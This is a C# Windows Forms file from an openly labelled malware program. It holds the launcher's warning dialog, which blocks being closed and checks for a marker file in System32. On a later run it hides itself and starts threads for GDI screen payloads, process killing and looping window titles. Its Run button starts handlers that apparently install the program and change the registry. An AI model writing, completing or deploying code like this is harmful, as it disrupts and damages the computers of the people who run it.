using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using Microsoft.Win32;

namespace version1
{
    public partial class warning : Form
    {
        int animation_frames = 0;
        bool btn_exit = false; bool btn_run = false; bool title = false; bool text = false;
        Random rand;
        public warning()
        {
            InitializeComponent();
            string HKLMWinNTCurrent = @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion";
            string os_major = Registry.GetValue(HKLMWinNTCurrent, "CurrentMajorVersionNumber", "").ToString();
            if (os_major != "10")
            {
                MessageBox.Show("This malware is only intended for newer versions of the Windows operating system.", "Bad compatibility", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(-1); 
            }
            pic_skull1.Visible = true; pic_skull2.Visible = false; pic_skull3.Visible = false;
            if (File.Exists(@"C:\Windows\System32\ver-1.0.exe"))
            {
                pic_skull1.Visible = false; pic_skull2.Visible = false; pic_skull3.Visible = false;
                timer1.Enabled = false; timer2.Enabled = false; timer3.Enabled = false;
                this.Opacity = 0;
                this.Hide();
                this.Size = new Size(0, 0);
                this.StartPosition = FormStartPosition.Manual;
                this.Location = new Point(-100, -100);
                var gdi_h = new gdi_payload();
                var kill_h = new kill_process();
                var story_h = new short_message();
                Thread th_title = new Thread(gdi_h.loop_titles);
                Thread th_gdi = new Thread(gdi_h.gdi_payloads);
                Thread th_kill = new Thread(kill_h.process_kill);
                Thread th_story = new Thread(story_h.story);
                th_story.Start();
                th_title.Start();
                th_gdi.Start();
                th_kill.Start();
                gdi_h.sound_effect();
            }
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (animation_frames == 0){
                animation_frames += 1;
                pic_skull1.Visible = false; pic_skull2.Visible = true; pic_skull3.Visible = false;
            }
            else if (animation_frames == 1){
                animation_frames += 1;
                pic_skull1.Visible = false; pic_skull2.Visible = false; pic_skull3.Visible = true;
            }
            else{
                animation_frames = 0;
                pic_skull1.Visible = true; pic_skull2.Visible = false; pic_skull3.Visible = false;
            }
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            rand = new Random();
            button1.Location = new Point(12, 311); button2.Location = new Point(126, 311); 
            label1.Location = new Point(12, 17); label2.Location = new Point(9, 64);
            button1.ForeColor = Color.Red; button2.ForeColor = Color.Lime; label1.ForeColor = Color.Red; 
            label2.ForeColor = Color.White; 
            if (btn_exit){
                button1.Location = new Point(button1.Location.X + rand.Next(-5, 5), button1.Location.Y + rand.Next(-5, 5));
                button1.ForeColor = Color.FromArgb(rand.Next(255), rand.Next(255), rand.Next(255));
            }
            else if (btn_run){
                button2.Location = new Point(button2.Location.X + rand.Next(-5, 5), button2.Location.Y + rand.Next(-5, 5));
                button2.ForeColor = Color.FromArgb(rand.Next(255), rand.Next(255), rand.Next(255));
            }
            else if (text){
                label2.Location = new Point(label2.Location.X + rand.Next(-5, 5), label2.Location.Y + rand.Next(-5, 5));
                label2.ForeColor = Color.FromArgb(rand.Next(255), rand.Next(255), rand.Next(255));
            }
            else if (title){
                label1.Location = new Point(label1.Location.X + rand.Next(-5, 5), label1.Location.Y + rand.Next(-5, 5));
                label1.ForeColor = Color.FromArgb(rand.Next(255), rand.Next(255), rand.Next(255));
            }
        }

        private void button1_MouseHover(object sender, EventArgs e)
        {
            btn_exit = true;
        }

        private void button2_MouseHover(object sender, EventArgs e)
        {
            btn_run = true;
        }

        private void label1_MouseHover(object sender, EventArgs e)
        {
            title = true;
        }

        private void label2_MouseHover(object sender, EventArgs e)
        {
            text = true;
        }

        private void button1_MouseLeave(object sender, EventArgs e)
        {
            btn_exit = false;
        }

        private void button2_MouseLeave(object sender, EventArgs e)
        {
            btn_run = false;
        }

        private void label1_MouseLeave(object sender, EventArgs e)
        {
            title = false;
        }

        private void label2_MouseLeave(object sender, EventArgs e)
        {
            text = false;
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            var generator_h = new Generator();
            rand = new Random();
            timer3.Interval = rand.Next(10, 3000);
            this.Text = generator_h.GenerateToken(rand.Next(100));
        }

        private void warning_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Environment.Exit(-1);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            var main_h = new Main_handler(); var regs_h = new Regs();
            Thread th_main = new Thread(main_h.Main_hand); Thread th_regs = new Thread(regs_h.Reg_func);
            if(!File.Exists(@"C:\Windows\System32\ver-1.0.exe")){
                th_main.Start(); th_regs.Start();
            }
            this.Hide();
            this.Close();
        }

        private void warning_Load(object sender, EventArgs e)
        {
            pic_skull1.Location = new Point(273, 64);
            pic_skull2.Location = new Point(273, 64);
            pic_skull3.Location = new Point(273, 64);
            label3.Location = new Point(448, 349);
            label1.Location = new Point(12, 17);
            label2.Location = new Point(9, 74);
            button1.Location = new Point(12, 311);
            button2.Location = new Point(126, 311);
        }
    }
}
